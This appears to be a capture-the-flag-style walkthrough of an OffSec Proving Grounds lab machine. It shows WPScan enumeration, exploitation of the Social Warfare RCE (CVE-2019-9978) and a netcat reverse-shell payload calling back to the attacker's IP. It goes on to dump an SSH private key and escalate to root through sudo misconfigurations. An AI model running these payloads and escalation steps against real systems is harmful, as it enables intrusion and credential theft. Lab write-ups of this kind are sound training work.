 |      - https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.158.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.158.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.158.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2025-03-18 9:37am GMT (1 year ago, per WordPress.org)
 | Active Installs: 10,000 (per WordPress.org)
 | Readme: http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 | [!] The version is out of date, the latest version is 4.5.6
 | [!] Directory listing is enabled
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 8 vulnerabilities identified:
 |
 | [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Arbitrary Settings Update
 |     UUID: 32085d2d-1235-42b4-baeb-bc43172a4972
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpscan.com/vulnerability/32085d2d-1235-42b4-baeb-bc43172a4972
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978
 |      - https://wordpress.org/support/topic/malware-into-new-update/
 |      - https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/
 |      - https://threatpost.com/wordpress-plugin-removed-after-zero-day-discovered/143051/
 |      - https://twitter.com/warfareplugins/status/1108826025188909057
 |      - https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/
 |
 | [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
 |     UUID: 7b412469-cc03-4899-b397-38580ced5618
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
 |      - https://www.webarxsecurity.com/social-warfare-vulnerability/
 |
 | [!] Title: Social Warfare < 4.3.1 - Subscriber+ Post Meta Deletion
 |     UUID: 5116068f-4b84-42ad-a88d-03e46096b41c
 |     Fixed in: 4.3.1
 |     References:
 |      - https://wpscan.com/vulnerability/5116068f-4b84-42ad-a88d-03e46096b41c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0402
 |
 | [!] Title: Social Warfare < 4.4.0 - Post Meta Deletion via CSRF
 |     UUID: 7140abf5-5966-4361-bd51-ee29d3071a30
 |     Fixed in: 4.4.0
 |     References:
 |      - https://wpscan.com/vulnerability/7140abf5-5966-4361-bd51-ee29d3071a30
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0403
 |
 | [!] Title: Social Sharing Plugin - Social Warfare < 4.4.4 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode
 |     UUID: ab221b58-369e-4010-ae36-be099b2f4c9b
 |     Fixed in: 4.4.4
 |     References:
 |      - https://wpscan.com/vulnerability/ab221b58-369e-4010-ae36-be099b2f4c9b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4842
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f5b9aff-0833-4887-ae59-df5bc88c7f91
 |
 | [!] Title: Social Sharing Plugin – Social Warfare < 4.4.6.2 - Authenticated(Contributor+) Stored Cross-Site Scripting via Shortcode
 |     UUID: 26ad138e-990a-4401-84e4-ea694ccf6e7f
 |     Fixed in: 4.4.6.2
 |     References:
 |      - https://wpscan.com/vulnerability/26ad138e-990a-4401-84e4-ea694ccf6e7f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1959
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1016f16c-0ab2-4cac-a7a5-8d93a37e7894
 |
 | [!] Title: Social Sharing Plugin – Social Warfare < 4.4.6 - Cross-Site Request Forgery
 |     UUID: acb8b33c-6b74-4d65-a3a5-5cad0c1ea8b0
 |     Fixed in: 4.4.6
 |     References:
 |      - https://wpscan.com/vulnerability/acb8b33c-6b74-4d65-a3a5-5cad0c1ea8b0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34825
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f105bee6-21b2-4014-bb0a-9e53c49e29b0
 |
 | [!] Title: Social Warfare < 4.5.6 - Contributor+ Stored XSS
 |     UUID: 447065f5-f2f9-4e0c-b524-c730655f3d79
 |     Fixed in: 4.5.6
 |     References:
 |      - https://wpscan.com/vulnerability/447065f5-f2f9-4e0c-b524-c730655f3d79
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26973
 |      - https://patchstack.com/database/wordpress/plugin/social-warfare/vulnerability/wordpress-social-warfare-plugin-4-5-4-cross-site-scripting-xss-vulnerability
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.158.78/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 Checking Known Locations - Time: 00:02:15 <=========================================================================================> (7343 / 7343) 100.00% Time: 00:02:15
[i] 2 plugin(s) Identified.
[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:11 <===========================================================================================> (652 / 652) 100.00% Time: 00:00:11
[i] No themes Found.
[+] Enumerating Timthumbs
 Checking Known Locations - Time: 00:00:45 <=========================================================================================> (2575 / 2575) 100.00% Time: 00:00:45

[i] No Timthumbs Found.

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:02 <============================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Enumerating DB Exports
 Checking DB Exports - Time: 00:00:01 <==================================================================================================> (75 / 75) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[+] Enumerating Backup Folders
 Checking Backup Folders - Time: 00:00:00 <================================================================================================> (6 / 6) 100.00% Time: 00:00:00
[i] No Backup Folders Found.
[+] Enumerating Medias (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:02 <=======================================================================================> (100 / 100) 100.00% Time: 00:00:02

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)

[+] max
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================> (10 / 10) 100.00% Time: 00:00:00
[i] 2 user(s) Identified.
[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 17
[+] Finished: Wed Aug 19 05:46:24 2026
[+] Requests Done: 10972
[+] Cached Requests: 13
[+] Most response codes received: 404: 10910, 200: 54, 301: 4, 500: 3, 302: 1
[+] Data Sent: 3.185 MB
[+] Data Received: 17.793 MB
[+] Memory used: 307.418 MB
[+] Elapsed time: 00:03:45

```

```bash
 | [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
 |     UUID: 7b412469-cc03-4899-b397-38580ced5618
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
 |      - https://www.webarxsecurity.com/social-warfare-vulnerability/
```

![[attachments/Offsec PG Play/So Simple/image.png]]

```bash
┌──(kali㉿kali)-[~/CVEs/CVE-2019-9978]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.158.78 - - [19/Aug/2026 06:09:50] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -

──(venv)─(kali㉿kali)-[~/CVEs/CVE-2019-9978]
└─$ python3 CVE-2019-9978.py -t http://192.168.158.78/wordpress/ --payload-uri http://192.168.45.231:8000/payload.txt
[>] Sending Payload to System!
[*] Received Response From Server!
[<] Received:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
max:x:1000:1000:roel:/home/max:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
steven:x:1001:1001:Steven,,,:/home/steven:/bin/bash

```

```bash
┌──(kali㉿kali)-[~/CVEs/CVE-2019-9978]
└─$ cat payload.txt 
<pre>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.231 8443 >/tmp/f')</pre>

┌──(kali㉿kali)-[~/CVEs/CVE-2019-9978]
└─$ nc -lvnp 8443                                      
listening on [any] 8443 ...
connect to [192.168.45.231] from (UNKNOWN) [192.168.158.78] 45382
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@so-simple:/var/www/html/wordpress/wp-admin$ ^Z
zsh: suspended  nc -lvnp 8443
                                                                                                                                                                           
┌──(kali㉿kali)-[~/CVEs/CVE-2019-9978]
└─$ stty raw -echo; fg                         
[1]  + continued  nc -lvnp 8443

www-data@so-simple:/var/www/html/wordpress/wp-admin$ export TERM=xterm
www-data@so-simple:/var/www/html/wordpress/wp-admin$ reset

```

```bash
www-data@so-simple:/home$ cd max
www-data@so-simple:/home/max$ ls
local.txt  personal.txt  this  user.txt
www-data@so-simple:/home/max$ cat local.txt 
9bfae20746321c5b9234cd75b7154ca4
www-data@so-simple:/home/max$ ls -la
total 52
drwxr-xr-x 7 max  max  4096 Aug 22  2020 .
drwxr-xr-x 4 root root 4096 Jul 12  2020 ..
lrwxrwxrwx 1 max  max     9 Aug 22  2020 .bash_history -> /dev/null
-rw-r--r-- 1 max  max   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 max  max  3810 Jul 12  2020 .bashrc
drwx------ 2 max  max  4096 Jul 12  2020 .cache
drwx------ 3 max  max  4096 Jul 12  2020 .gnupg
drwxrwxr-x 3 max  max  4096 Jul 12  2020 .local
-rw-r--r-- 1 max  max   807 Feb 25  2020 .profile
drwxr-xr-x 2 max  max  4096 Jul 14  2020 .ssh
-rw-r--r-- 1 max  max    33 Aug 19 09:39 local.txt
-rw-r--r-- 1 max  max    49 Jul 12  2020 personal.txt
drwxrwxr-x 3 max  max  4096 Jul 12  2020 this
-rwxr-x--- 1 max  max    43 Aug 22  2020 user.txt
www-data@so-simple:/home/max$ cd .ssh/
www-data@so-simple:/home/max/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
www-data@so-simple:/home/max/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
www-data@so-simple:/home/max/.ssh$ 

```

login as max

```bash
max@so-simple:/tmp$ sudo -l
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service

```

```bash
max@so-simple:/tmp$ sudo -u steven /usr/sbin/service 
Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
max@so-simple:/tmp$ sudo -u steven /usr/sbin/service ../../bin/sh
$ whoami
steven
$ bash -i

```

steven

```bash
steven@so-simple:/$ sudo -l
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh

```

no [server-health.sh](http://server-health.sh) so create one

```bash
steven@so-simple:/opt$ cat /opt/tools/server-health.sh
cat: /opt/tools/server-health.sh: No such file or directory
steven@so-simple:/opt$ echo "/opt/tools/server-health.sh"
/opt/tools/server-health.sh
steven@so-simple:/opt$ echo "vi -c ':shell'" > /opt/tools/server-health.sh
bash: /opt/tools/server-health.sh: No such file or directory
steven@so-simple:/opt$ touch /opt/tools/server-health.sh
touch: cannot touch '/opt/tools/server-health.sh': No such file or directory
steven@so-simple:/opt$ nano /opt/tools/server-health.sh
steven@so-simple:/opt$ vi /opt/tools/server-health.sh
steven@so-simple:/opt$ cd /opt
steven@so-simple:/opt$ ls
steven@so-simple:/opt$ ls -la
total 8
drwxr-xr-x  2 steven steven 4096 Sep  3  2020 .
drwxr-xr-x 20 root   root   4096 Aug 14  2020 ..
steven@so-simple:/opt$ mkdir tools
steven@so-simple:/opt$ ls
tools
steven@so-simple:/opt$ cd tools
steven@so-simple:/opt/tools$ vi /opt/tools/server-health.sh
steven@so-simple:/opt/tools$ ls
server-health.sh
steven@so-simple:/opt/tools$ chmod +x server-health.sh 
steven@so-simple:/opt/tools$ sudo ./server-health.sh 
root@so-simple:/opt/tools# cd /root
root@so-simple:~# cd -
/opt/tools
root@so-simple:/opt/tools# cat server-health.sh 
#!/bin/bash
bash
root@so-simple:/opt/tools# cd /root
root@so-simple:~# cat proof.txt 
dfbc5f810bd49592549223a4c77f89df
root@so-simple:~# 

```
